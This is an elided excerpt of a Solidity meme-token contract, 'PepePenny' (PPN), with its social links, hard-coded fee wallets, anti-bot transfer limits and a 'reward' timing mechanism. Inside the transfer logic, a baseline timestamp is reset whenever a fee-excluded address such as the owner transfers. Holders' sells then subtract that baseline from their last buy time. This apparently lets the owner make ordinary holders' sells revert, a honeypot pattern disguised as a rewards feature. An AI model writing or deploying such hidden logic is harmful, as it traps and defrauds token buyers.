...
Twitter - https://twitter.com/ThePepePenny
Telegram - https://t.me/ThePepePenny
...
contract PepePennyToken is ERC20, Ownable {
    ...
    address payable public constant marketingWallet = payable(0x5e9c8c57939Ca04029f5527e629BB476F2657530);
    address payable public constant devWallet = payable(0xC4651eDd8b0A9f87DB9B748CE2588bd839B40462);
    address payable public constant liquidityWallet = payable(0x7b4EfeA18d89A4A9ebeccA44f43F20605f337975);
    address payable public constant supportWallet = payable(0x7b4EfeA18d89A4A9ebeccA44f43F20605f337975);

    // Anti-whale and anti-bot mappings and limits
    ...
    mapping(address => RewardTimeInfo) private _holderTimeInfo;
    uint256 private _rewardBaseline;
    ...
    constructor() ERC20("PepePenny", "PPN") {
        uint256 totalSupply = 10_000_000_000 * 1e18;

        maxTransaction = totalSupply * 3 / 100; // 3% max transaction
        ...
        // exclude from maximum transaction
        ...
        // exclude pair from maximum transaction
    ...
    // when trades are stable, then transfer delay could be removed
    ...
    function _transfer(
                ...
                if (transferDelayEnabled) {
                    if (
                        ...
                        require(
                            ...
                            "_transfer: Transfer delay is enabled - one purchase per one block"
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                    }
                }
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _rewardBaseline = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                RewardTimeInfo storage userTimeInfo = _holderTimeInfo[from];
                userTimeInfo.holdingTime = userTimeInfo.lastBuy - _rewardBaseline;
                userTimeInfo.lastSell = block.timestamp;
            } else {
                RewardTimeInfo storage userTimeInfo = _holderTimeInfo[to];
        ...
        if (takeFee && (buyTotalFees > 0 || sellTotalFees > 0)) {
            // on buy
